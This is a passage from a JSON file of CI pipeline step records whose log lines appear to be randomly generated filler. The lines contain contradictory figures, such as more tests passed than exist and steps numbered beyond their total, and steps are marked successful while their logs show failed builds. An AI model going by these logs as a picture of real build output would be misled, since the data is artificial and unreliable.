          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: dist.zip (19MB)",
          "Checking out main branch",
          "Minifying main.js",
          "[12:19:05] INFO: Starting build process",
          "Generating source maps...",
          "Cache saved successfully",
          "Done.",
          "[12:19:05] WARN: Deprecated API usage",
          "Layer 6/12: ENV command",
          "\u2713 All checks passed",
          "Ran 168 tests in 36s",
          "Building Docker image...",
          "Step 12/24: Building",
          "[12:19:05] DEBUG: Loading configuration",
          "[12:19:05] DEBUG: Memory usage: 1929MB",
          "[12:19:05] DEBUG: Connection pool: 19 active",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-09T12:19:56.070345",
        "finished_at": "2025-12-09T12:20:07.528400",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Environment: test",
          "pip: Installing build dependencies...",
          "WARNING: axios has known vulnerabilities",
          "Uploading artifact 'build' (10 files)",
          "Snapshots: 44 passed, 31 total",
          "[12:19:05] INFO: Connecting to database",
          "Pushing to registry...",
          "Optimizing 40 modules...",
          "Compiling utils/service.java...",
          "[12:19:05] DEBUG: Initializing service",
          "Connection established",
          "Finished.",
          "Compiling utils/utils.go...",
          "Generating source maps...",
          "pip install: Successfully installed prettier-5.20",
          "[12:19:05] DEBUG: Query executed in 31ms",
          "OK",
          "Processing...",
          "Environment: test",
          "[12:19:05] DEBUG: Connection pool: 13 active",
          "npm notice: created a lockfile",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:05] WARN: Deprecated API usage",
          "\u2713 Task completed in 4723ms",
          "Transforming 543 files...",
          "Fetching submodules...",
          "\u2717 build failed with exit code 108",
          "pip: Downloading prettier-3.7.tar.gz",
          "Tests: 265 passed, 130 total",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Completed.",
          "Completed.",
          "\u2713 deploy completed",
          "Test Suites: 11 passed, 47 total",
          "Layer 3/14: ENV command",
          "Optimizing 19 modules...",
          "Success!",
          "yarn add: Done in 8.74s",
          "Done.",
          "[12:19:05] DEBUG: Memory usage: 897MB",
          "Step 5/15: Testing",
          "Tests: 90 passed, 160 total",
          "Pulling image: python:latest",
          "Step 9/15: Deploying",
          "Artifact uploaded: build.tar.gz (31MB)",
          "pip: Downloading prettier-3.19.tar.gz",
          "Bundling main.css",
          "Verifying...",
          "Creating production build...",
          "Loading...",
          "Success!",
          "FAILED: test_auth_login",
          "[12:19:05] DEBUG: Initializing service",
          "Step 11/24: Linting",
          "Layer 7/15: RUN command",
          "yarn add: Done in 24.44s",
          "Ran 140 tests in 60s",
          "Loading...",
          "Finished.",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/app.ts...",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Test Suites: 30 passed, 44 total",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 All checks passed",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:05] DEBUG: Memory usage: 1168MB",
          "[12:19:05] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "Building Docker image...",
          "Compiling components/utils.go...",
          "Test Suites: 16 passed, 23 total",
          "Layer 5/15: COPY command",
          "\u2713 test completed",
          "Creating production build...",
          "Waiting...",
          "Image pulled successfully",
          "Compiling src/utils.go...",
          "Snapshots: 39 passed, 22 total",
          "Compiling lib/utils.go...",
          "TLS handshake completed",
          "Cache miss for key-1823",
          "Using Python 3.9",
          "Transforming 399 files...",
          "Transforming 957 files...",
          "HEAD is now at bcaae60",
          "Checking out develop branch",
          "\u2713 Task completed in 648ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing eslint@5.11.8",
          "[12:19:05] WARN: Deprecated API usage",
          "[12:19:05] DEBUG: Initializing service",
          "Using Python 3.11",
          "Environment: development",
          "[12:19:05] DEBUG: Query executed in 82ms",
          "NODE_ENV=test",
          "Connecting to example.com:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_auth_login (466ms)",
          "Minifying vendor.js",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: dist.zip (62MB)",
          "OK",
          "Artifact downloaded: 33MB",
          "npm install: added 327 packages",
          "Image pulled successfully",
          "Minifying main.js",
          "[12:19:05] INFO: Processing request",
          "Optimizing 64 modules...",
          "Processing...",
          "Step 9/20: Building",
          "[12:19:05] ERROR: Connection failed",
          "Connection established",
          "Using Node.js 15.14.6",
          "npm install: added 149 packages",
          "Verifying...",
          "Snapshots: 4 passed, 5 total",
          "[12:19:05] INFO: Processing request",
          "Cache miss for key-6743",
          "Layer 2/12: ENV command",
          "pip: Collecting webpack",
          "Using Node.js 17.13.6",
          "Installing express@5.18.4",
          "[12:19:05] DEBUG: Memory usage: 1984MB",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Verifying...",
          "Done.",
          "\u2713 build completed",
          "Minifying vendor.js",
          "Connection established",
          "Compiling src/main.py...",
          "\u2713 Task completed in 3846ms",
          "Compiling src/service.java...",
          "Already up to date.",
          "[12:19:05] WARN: Deprecated API usage",
          "pip: Collecting lodash",
          "Image pulled successfully",
          "pip: Collecting axios",
          "[12:19:05] DEBUG: Memory usage: 950MB",
          "Test Suites: 48 passed, 36 total",
          "Step 3/15: Running migrations",
          "Connecting to test.io:443...",
          "[12:19:05] DEBUG: Initializing service",
          "Platform: linux-x64",
          "\u2713 Task completed in 866ms",
          "Completed.",
          "pip: Downloading express-3.15.tar.gz",
          "Cache invalidated: dependencies",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Uploading artifact 'coverage' (34 files)",
          "Connecting to example.com:443...",
          "Compiling components/main.py...",
          "npm install: resolved 1629 packages",
          "[12:19:05] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 18",
          "Switched to branch 'feature/task-801'",
          "Compiling lib/handler.rs...",
          "Ready.",
          "Compiling utils/main.py...",
          "Step 8/16: Building",
          "Environment: production",
          "Already up to date.",
          "Verifying...",
          "Connection established",
          "Snapshots: 9 passed, 10 total",
          "\u2717 build failed with exit code 117",
          "HEAD is now at 1856cf2",
          "npm notice: created a lockfile",
          "Waiting...",
          "Coverage: 97% statements, 95% branches",
          "Ready.",
          "[12:19:05] INFO: Starting build process",
          "Exception: TypeError",
          "Compiling lib/main.py...",
          "Test Suites: 34 passed, 19 total",
          "Artifact downloaded: 1MB",
          "[12:19:05] INFO: Request completed",
          "Already up to date.",
          "[12:19:05] WARN: Deprecated API usage",
          "pip install: Successfully installed prettier-5.8",
          "Connecting to startup.dev:443...",
          "Creating production build...",
          "OK",
          "Cache hit for key-4214",
          "Platform: win32-x64",
          "Step 15/19: Linting",
          "Completed.",
          "[12:19:05] ERROR: Connection failed",
          "\u2717 build failed with exit code 4",
          "Cache invalidated: build",
          "Cache saved successfully",
          "Finished.",
          "[12:19:05] DEBUG: Initializing service",
          "Step 13/23: Installing dependencies",
          "Compiling lib/app.ts...",
          "Using Node.js 18.0.8",
          "HEAD is now at 701b418",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-09T12:20:07.528400",
        "finished_at": "2025-12-09T12:20:18.986455",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Uploading artifact 'build' (3 files)",
          "WARNING: express has known vulnerabilities",
          "[12:19:05] INFO: Starting build process",
          "Success!",
          "Loading...",
          "Time: 110.367s",
          "\u2713 Step 'setup' succeeded",
          "[12:19:05] DEBUG: Query executed in 51ms",
          "[12:19:05] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 64",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out main branch",
          "\u2713 Task completed in 299ms",
          "Finished.",
          "pip: Collecting react",
          "Tests: 244 passed, 258 total",
          "WARNING: lodash has known vulnerabilities",
          "Using Python 3.9",
          "Finished.",
          "[12:19:05] INFO: Processing request",
          "Tests: 77 passed, 457 total",
          "Cache miss for key-4701",
          "Test Suites: 34 passed, 35 total",
          "Finished.",
          "POST /api - 200 (89ms)",
          "Success!",
          "[12:19:05] DEBUG: Initializing service",
          "Using Python 3.12",
          "Success!",
          "Step 15/16: Installing dependencies",
          "NODE_ENV=development",
          "[12:19:05] INFO: Connecting to database",
          "Bundling main.css",
          "\u2713 Step 'checkout' succeeded",
          "Step 7/21: Linting",
          "Connection established",
          "HEAD is now at e90cd3b",
          "Image pulled successfully",
          "\u2713 deploy completed",
          "Step 20/23: Installing dependencies",
          "[12:19:05] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "Step 10/15: Testing",
          "npm install: added 475 packages",
          "Building Docker image...",
          "Verifying...",
          "Already up to date.",
          "[12:19:05] INFO: Request completed",
          "Artifact downloaded: 27MB",
          "Cache hit for key-5298",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-6112",
          "[12:19:05] DEBUG: Loading configuration",
          "Test Suites: 46 passed, 16 total",
          "[12:19:05] INFO: Connecting to database",
          "WARNING: react has known vulnerabilities",
          "Verifying...",
          "Step 4/19: Testing",
          "Using Node.js 17.8.0",
          "Building Docker image...",
          "pip install: Successfully installed lodash-1.7",
          "Pulling image: alpine:latest",
          "Step 12/19: Installing dependencies",
          "Artifact uploaded: dist.zip (31MB)",
          "Waiting...",
          "pip: Downloading lodash-5.5.tar.gz",
          "Step 19/19: Deploying",
          "Checking out develop branch",
          "Waiting...",
          "GET /status - 204 (89ms)",
          "Waiting...",
          "pip install: Successfully installed eslint-3.19",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: axios has known vulnerabilities",
          "Compiling utils/utils.go...",
          "pip: Installing build dependencies...",
          "Exception: NullPointerException",
          "HEAD is now at 9dec80c",
          "[12:19:05] WARN: Deprecated API usage",
          "Layer 5/11: ENV command",
          "Artifact uploaded: dist.zip (73MB)",
          "Loading...",
          "Cache invalidated: node_modules",
          "[12:19:05] INFO: Starting build process",
          "Creating production build...",
          "Uploading artifact 'dist' (1 files)",
          "[12:19:05] INFO: Connecting to database",
          "Cache invalidated: build",
          "  PASS: test_db_connect (124ms)",
          "Artifact uploaded: dist.zip (17MB)",
          "Connection established",
          "Step 6/15: Linting",
          "Already up to date.",
          "[12:19:05] DEBUG: Query executed in 73ms",
          "Done.",
          "Step 10/21: Deploying",
          "Compiling utils/utils.go...",
          "Uploading artifact 'coverage' (48 files)",
          "npm notice: created a lockfile",
          "Coverage: 88% statements, 90% branches",
          "[12:19:05] ERROR: Connection failed",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 475 files...",
          "[12:19:05] DEBUG: Memory usage: 734MB",
          "npm notice: package.json updated",
          "\u2713 Step 'checkout' succeeded",
          "Snapshots: 27 passed, 46 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 3208ms",
          "FAILED: test_cache_hit",
          "[12:19:05] DEBUG: Loading configuration",
          "Cache miss for key-5475",
          "Completed.",
          "npm notice: package.json updated",
          "Platform: win32-x64",
          "Compiling components/index.js...",
          "Ran 119 tests in 17s",
          "Checking out main branch",
          "Already up to date.",
          "WARNING: webpack has known vulnerabilities",
          "Success!",
          "Test Suites: 38 passed, 21 total",
          "Artifact uploaded: dist.zip (63MB)",
          "\u2717 build failed with exit code 40",
          "Step 5/20: Testing",
          "Creating production build...",
          "Time: 40.633s",
          "\u2713 Step 'install' succeeded",
          "  PASS: test_db_connect (242ms)",
          "Platform: linux-x64",
          "Minifying app.js",
          "Building Docker image...",
          "[12:19:05] DEBUG: Initializing service",
          "Checking out develop branch",
          "Creating production build...",
          "Artifact downloaded: 8MB",
          "Already up to date.",
          "Step 2/25: Linting",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Snapshots: 2 passed, 44 total",
          "pip: Downloading lodash-3.17.tar.gz",
          "Generating source maps...",
          "Finished.",
          "Completed.",
          "Tests: 388 passed, 70 total",
          "Compiling components/main.py...",
          "Verifying...",
          "Waiting...",
          "Pushing to registry...",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "HEAD is now at d02760c",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out main branch",
          "[12:19:05] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:05] DEBUG: Query executed in 1ms",
          "Step 12/19: Running migrations",
          "Optimizing 72 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Downloading axios-1.10.tar.gz",
          "OK",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'dist' (10 files)",
          "Ran 103 tests in 15s",
          "Step 2/24: Testing",
          "WARNING: lodash has known vulnerabilities",
          "Done.",
          "Success!",
          "[12:19:05] DEBUG: Memory usage: 1225MB",
          "Success!",
          "[12:19:05] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (65MB)",
          "Cache hit for key-6311",
          "[12:19:05] DEBUG: Initializing service",
          "Cache restored successfully (311MB)",
          "[12:19:05] INFO: Request completed",
          "Step 16/16: Running migrations",
          "Compiling utils/index.js...",
          "Uploading artifact 'build' (50 files)",
          "NODE_ENV=test",
          "pip: Downloading lodash-4.8.tar.gz",
          "Artifact downloaded: 29MB",
          "  PASS: test_cache_hit (86ms)",
          "\u2713 Step 'setup' succeeded",
          "Compiling lib/app.ts...",
          "Connection established",
          "Layer 3/10: ENV command",
          "Step 7/21: Deploying",
          "Compiling utils/index.js...",
          "Exception: RuntimeError",
          "Creating production build...",
          "Compiling src/service.java...",
          "Artifact downloaded: 13MB",
          "Tests: 446 passed, 143 total",
          "Success!",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-09T12:20:18.986455",
        "finished_at": "2025-12-09T12:20:53.360621",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Minifying main.js",
          "Artifact uploaded: dist.zip (75MB)",
          "[12:19:05] INFO: Request completed",
          "Step 9/23: Linting",
          "[12:19:05] INFO: Cache refreshed",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/handler.rs...",
          "Transforming 449 files...",
          "WARNING: eslint has known vulnerabilities",
          "Cache invalidated: build",
          "Using Python 3.10",
          "pip install: Successfully installed eslint-5.15",
          "Connection established",
          "Artifact uploaded: dist.zip (92MB)",
          "Transforming 815 files...",
          "Verifying...",
          "Step 4/22: Building",
          "Compiling components/index.js...",
          "Step 4/18: Linting",
          "Switched to branch 'hotfix/task-487'",
          "Cache restored successfully (45MB)",
          "Bundling runtime.css",
          "Bundling runtime.js",
          "Coverage: 94% statements, 63% branches",
          "pip: Collecting prettier",
          "npm notice: created a lockfile",
          "Bundling runtime.css",
          "\u2713 Step 'setup' succeeded",
          "[12:19:05] INFO: Connecting to database",
          "Connecting to acme.corp:443...",
          "Step 9/17: Running migrations",
          "\u2713 deploy completed",
          "[12:19:05] INFO: Cache refreshed",
          "[12:19:05] DEBUG: Initializing service",
          "Generating source maps...",
          "Compiling utils/app.ts...",
          "\u2717 build failed with exit code 25",
          "Step 13/22: Testing",
          "WARNING: express has known vulnerabilities",
          "npm notice: package.json updated",
          "Creating production build...",
          "pip: Collecting express",
          "NODE_ENV=production",
          "Using Node.js 19.1.6",
          "Snapshots: 14 passed, 0 total",
          "\u2713 Task completed in 3798ms",
          "Cache miss for key-7362",
          "pip: Downloading axios-1.0.tar.gz",
          "Compiling utils/index.js...",
          "Time: 102.985s",
          "Compiling src/utils.go...",
          "Verifying...",
          "Coverage: 89% statements, 72% branches",
          "Step 16/24: Deploying",
          "GET /status - 201 (42ms)",
          "[12:19:05] WARN: Deprecated API usage",
          "[12:19:05] INFO: Processing request",
          "Optimizing 28 modules...",
          "[12:19:05] DEBUG: Loading configuration",
          "Processing...",
          "Time: 73.934s",
          "Cache invalidated: build",
          "Tests: 419 passed, 151 total",
          "npm install: added 487 packages",
          "NODE_ENV=development",
          "[12:19:05] INFO: Cache refreshed",
          "Completed.",
          "Generating source maps...",
          "Compiling src/index.js...",
          "Cache restored successfully (129MB)",
          "[12:19:05] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "Compiling lib/service.java...",
          "POST /api - 202 (67ms)",
          "Step 11/24: Deploying",
          "Coverage: 86% statements, 89% branches",
          "yarn add: Done in 7.52s",
          "npm notice: created a lockfile",
          "Compiling lib/main.py...",
          "[12:19:05] DEBUG: Query executed in 68ms",
          "Compiling utils/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Uploading artifact 'build' (5 files)",
          "Tests: 91 passed, 492 total",
          "Ran 176 tests in 17s",
          "npm notice: package.json updated",
          "Compiling components/service.java...",
          "Step 5/22: Testing",
          "Ran 21 tests in 38s",
          "Cache restored successfully (469MB)",
          "Uploading artifact 'coverage' (23 files)",
          "[12:19:05] DEBUG: Query executed in 55ms",
          "[12:19:05] INFO: Request completed",
          "Switched to branch 'bugfix/task-934'",
          "Building Docker image...",
          "POST /upload - 201 (53ms)",
          "pip: Installing build dependencies...",
          "[12:19:05] DEBUG: Initializing service",
          "Step 10/17: Installing dependencies",
          "GET /health - 204 (54ms)",
          "Fetching submodules...",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 358 packages",
          "OK",
          "Uploading artifact 'coverage' (32 files)",
          "npm notice: created a lockfile",
          "  PASS: integration/test_cache_hit.spec.js",
          "Step 12/25: Testing",
          "Optimizing 77 modules...",
          "Transforming 538 files...",
          "\u2713 package completed",
          "[12:19:05] ERROR: Connection failed",
          "WARNING: jest has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Tests: 139 passed, 79 total",
          "pip: Collecting axios",
          "Image pulled successfully",
          "Layer 6/9: RUN command",
          "Uploading artifact 'dist' (23 files)",
          "[12:19:05] DEBUG: Memory usage: 342MB",
          "FAILED: test_api_health",
          "Pulling image: python:18",
          "[12:19:05] DEBUG: Connection pool: 4 active",
          "Exception: ValueError",
          "Pulling image: python:3.11",
          "Success!",
          "WARNING: webpack has known vulnerabilities",
          "Platform: darwin-arm64",
          "Cache invalidated: dependencies",
          "Cache invalidated: build",
          "WARNING: axios has known vulnerabilities",
          "[12:19:05] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Bundling main.js",
          "\u2713 Task completed in 4297ms",
          "Ran 111 tests in 25s",
          "pip: Downloading eslint-5.18.tar.gz",
          "Fetching submodules...",
          "Checking out main branch",
          "Loading...",
          "Ran 151 tests in 11s",
          "Environment: staging",
          "Checking out main branch",
          "Connection established",
          "\u2713 Task completed in 1759ms",
          "Snapshots: 7 passed, 32 total",
          "Image pulled successfully",
          "Generating source maps...",
          "Completed.",
          "Using Python 3.12",
          "Image pulled successfully",
          "\u2713 All checks passed",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'build' (2 files)",
          "Loading...",
          "npm install: resolved 1464 packages",
          "Fetching submodules...",
          "Test Suites: 32 passed, 33 total",
          "npm notice: package.json updated",
          "Environment: production",
          "Test Suites: 13 passed, 39 total",
          "  PASS: integration/test_db_connect.spec.js",
          "Uploading artifact 'dist' (7 files)",
          "npm install: added 266 packages",
          "\u2717 build failed with exit code 30",
          "[12:19:05] WARN: Deprecated API usage",
          "Done.",
          "Creating production build...",
          "Coverage: 78% statements, 100% branches",
          "Verifying...",
          "Success!",
          "[12:19:05] INFO: Starting build process",
          "Pushing to registry...",
          "Ran 53 tests in 4s",
          "Already up to date.",
          "Image pulled successfully",
          "FAILED: test_user_create",
          "Connecting to example.com:443...",
          "[12:19:05] INFO: Connecting to database",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Pulling image: node:3.11",
          "Compiling src/handler.rs...",
          "Step 3/21: Deploying",
          "yarn add: Done in 15.43s",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:19:05] DEBUG: Query executed in 52ms",
          "npm notice: created a lockfile",
          "HEAD is now at 39df5af",
          "Creating production build...",
          "\u2713 All checks passed",
          "[12:19:05] DEBUG: Initializing service",
          "TLS handshake completed",
          "Done.",
          "Step 6/15: Linting",
          "Creating production build...",
          "Finished.",
          "pip: Collecting lodash",
          "Ready.",
          "Pushing to registry...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-09T12:20:53.360621",
        "finished_at": "2025-12-09T12:21:16.276732",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:19:05] DEBUG: Connection pool: 7 active",
          "[12:19:05] WARN: Deprecated API usage",
          "Step 19/25: Linting",
          "Compiling components/app.ts...",
          "[12:19:05] DEBUG: Loading configuration",
          "Compiling lib/handler.rs...",
          "\u2717 build failed with exit code 53",
          "npm install: resolved 685 packages",
          "Installing eslint@5.9.5",
          "Connecting to cloud.services:443...",
          "[12:19:05] DEBUG: Loading configuration",
          "Connecting to acme.corp:443...",
          "Checking out develop branch",
          "Optimizing 12 modules...",
          "[12:19:05] WARN: Deprecated API usage",
          "Verifying...",
          "Layer 2/8: ENV command",
          "Artifact uploaded: dist.zip (5MB)",
          "Minifying main.js",
          "pip: Collecting eslint",
          "Step 3/24: Installing dependencies",
          "[12:19:05] DEBUG: Query executed in 96ms",
          "\u2717 build failed with exit code 4",
          "Ran 46 tests in 42s",
          "Bundling vendor.js",
          "Transforming 322 files...",
          "Layer 5/10: RUN command",
          "pip install: Successfully installed eslint-2.8",
          "Using Node.js 14.12.6",
          "Building Docker image...",
          "Cache saved successfully",
          "[12:19:05] WARN: Deprecated API usage",
          "Verifying...",
          "Step 10/22: Installing dependencies",
          "Checking out master branch",
          "Compiling src/utils.go...",
          "OK",
          "Cache saved successfully",
          "WARNING: react has known vulnerabilities",
          "Test Suites: 7 passed, 29 total",
          "Test Suites: 5 passed, 25 total",
          "Uploading artifact 'dist' (35 files)",
          "Step 19/17: Installing dependencies",
          "\u2717 build failed with exit code 45",
          "Waiting...",
          "Uploading artifact 'coverage' (47 files)",
          "Ran 166 tests in 41s",
          "Step 15/19: Deploying",
          "Step 11/17: Linting",
          "Step 10/24: Installing dependencies",
          "Step 13/22: Installing dependencies",
          "Connection established",
          "Using Python 3.9",
          "Step 20/22: Testing",
          "yarn add: Done in 30.57s",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "pip: Downloading express-5.19.tar.gz",
          "Processing...",
          "Completed.",
          "Already up to date.",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 15 passed, 39 total",
          "Step 16/21: Installing dependencies",
          "NODE_ENV=test",
          "Image pulled successfully",
          "Completed.",
          "WARNING: axios has known vulnerabilities",
          "[12:19:05] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "Environment: development",
          "GET /api - 201 (18ms)",
          "Compiling src/index.js...",
          "Ready.",
          "WARNING: eslint has known vulnerabilities",
          "Bundling vendor.css",
          "Uploading artifact 'dist' (29 files)",
          "Step 14/17: Testing",
          "Platform: linux-x64",
          "Ready.",
          "Ran 163 tests in 35s",
          "yarn add: Done in 29.46s",
          "NODE_ENV=test",
          "Already up to date.",
          "NODE_ENV=production",
          "Compiling components/utils.go...",
          "pip: Installing build dependencies...",
          "POST /data - 202 (37ms)",
          "Building Docker image...",
          "\u2713 Task completed in 4163ms",
          "Connection established",
          "  PASS: e2e/test_api_health.spec.js",
          "Exception: RuntimeError",
          "[12:19:05] DEBUG: Memory usage: 952MB",
          "npm notice: created a lockfile",
          "Using Node.js 20.20.10",
          "Connection established",
          "Cache hit for key-7235",
          "[12:19:05] INFO: Starting build process",
          "Cache restored successfully (120MB)",
          "\u2713 Task completed in 887ms",
          "Transforming 155 files...",
          "Success!",
          "\u2713 All checks passed",
          "[12:19:05] INFO: Starting build process",
          "Checking out develop branch",
          "pip: Collecting lodash",
          "yarn add: Done in 1.13s",
          "Using Python 3.12",
          "NODE_ENV=production",
          "Verifying...",
          "Processing...",
          "Platform: linux-x64",
          "[12:19:05] INFO: Processing request",
          "Bundling vendor.css",
          "  PASS: integration/test_user_create.spec.js",
          "Step 2/16: Deploying",
          "Processing...",
          "npm install: resolved 329 packages",
          "Loading...",
          "POST /upload - 201 (447ms)",
          "[12:19:05] WARN: Deprecated API usage",
          "pip install: Successfully installed react-4.12",
          "Connection established",
          "\u2713 Step 'install' succeeded",
          "Cache hit for key-2843",
          "[12:19:05] INFO: Starting build process",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Generating source maps...",
          "Finished.",
          "pip: Installing build dependencies...",
          "Connection established",
          "npm notice: created a lockfile",
          "  PASS: test_auth_login (351ms)",
          "[12:19:05] DEBUG: Loading configuration",
          "\u2713 Task completed in 2655ms",
          "[12:19:05] DEBUG: Query executed in 84ms",
          "OK",
          "  PASS: test_cache_hit (187ms)",
          "npm notice: package.json updated",
          "Compiling lib/main.py...",
          "Cache restored successfully (317MB)",
          "Minifying main.js",
          "Step 10/24: Linting",
          "Compiling components/handler.rs...",
          "\u2713 Task completed in 798ms",
          "Connecting to startup.dev:443...",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 113 packages",
          "GET /health - 204 (60ms)",
          "Already up to date.",
          "Using Python 3.11",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Optimizing 73 modules...",
          "NODE_ENV=test",
          "Artifact uploaded: dist.zip (8MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "[12:19:05] DEBUG: Loading configuration",
          "Artifact downloaded: 44MB",
          "Step 15/25: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Layer 10/11: RUN command",
          "HEAD is now at 56aefef",
          "Connecting to acme.corp:443...",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "HEAD is now at 53b5101",
          "Environment: production",
          "Waiting...",
          "Step 13/21: Deploying",
          "Completed.",
          "Building Docker image...",
          "Done.",
          "Time: 110.910s",
          "Transforming 396 files...",
          "Fetching submodules...",
          "Transforming 622 files...",
          "pip install: Successfully installed jest-3.20",
          "[12:19:05] DEBUG: Loading configuration",
          "npm install: added 91 packages",
          "[12:19:05] DEBUG: Initializing service",
          "[12:19:05] WARN: Deprecated API usage",
          "Compiling utils/service.java...",
          "Waiting...",
          "Platform: linux-x64",
          "yarn add: Done in 23.79s",
          "GET /status - 200 (42ms)",
          "WARNING: react has known vulnerabilities",
          "Using Node.js 14.4.9",
          "Ran 11 tests in 16s",
          "Verifying...",
          "[12:19:05] DEBUG: Query executed in 73ms",
          "\u2713 Step 'checkout' succeeded",
          "Compiling src/handler.rs...",
          "pip: Downloading prettier-1.14.tar.gz",
          "npm notice: created a lockfile",
          "Test Suites: 28 passed, 6 total",
          "Using Python 3.9",
          "WARNING: prettier has known vulnerabilities",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-09T12:21:16.276732",
        "finished_at": "2025-12-09T12:21:27.734787",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Layer 3/11: COPY command",
          "Already up to date.",
          "Using Node.js 17.19.9",
          "Pushing to registry...",
          "Step 14/21: Testing",
          "Processing...",
          "[12:19:05] DEBUG: Initializing service",
          "Compiling components/index.js...",
          "\u2713 package completed",
          "pip: Collecting lodash",
          "Pulling image: node:latest",
          "Image pulled successfully",
          "Step 16/23: Building",
          "[12:19:05] DEBUG: Query executed in 2ms",
          "Processing...",
          "npm install: added 369 packages",
          "Using Python 3.12",
          "pip install: Successfully installed prettier-4.15",
          "Platform: win32-x64",
          "Tests: 308 passed, 500 total",
          "Checking out master branch",
          "[12:19:05] WARN: Deprecated API usage",
          "Minifying main.js",
          "[12:19:05] WARN: Deprecated API usage",
          "[12:19:05] DEBUG: Connection pool: 20 active",
          "[12:19:05] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "[12:19:05] WARN: Deprecated API usage",
          "Snapshots: 40 passed, 31 total",
          "[12:19:05] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (23MB)",
          "[12:19:05] WARN: Deprecated API usage",
          "Step 15/22: Running migrations",
          "Snapshots: 5 passed, 50 total",
          "FAILED: test_auth_login",
          "WARNING: prettier has known vulnerabilities",
          "Compiling components/app.ts...",
          "Cache restored successfully (179MB)",
          "Creating production build...",
          "Compiling utils/app.ts...",
          "Using Python 3.9",
          "Installing axios@5.11.8",
          "TLS handshake completed",
          "Image pulled successfully",
          "Step 7/22: Building",
          "Waiting...",
          "Compiling src/service.java...",
          "Platform: darwin-arm64",
          "\u2713 All checks passed",
          "Bundling styles.js",
          "Time: 71.657s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed express-3.17",
          "Switched to branch 'bugfix/task-531'",
          "Image pulled successfully",
          "Minifying main.js",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:05] DEBUG: Connection pool: 9 active",
          "\u2713 All checks passed",
          "Switched to branch 'hotfix/task-785'",
          "Step 20/16: Testing",
          "Artifact downloaded: 47MB",
          "Switched to branch 'hotfix/task-196'",
          "\u2713 Task completed in 2064ms",
          "Platform: win32-x64",
          "Success!",
          "Compiling utils/index.js...",
          "Optimizing 22 modules...",
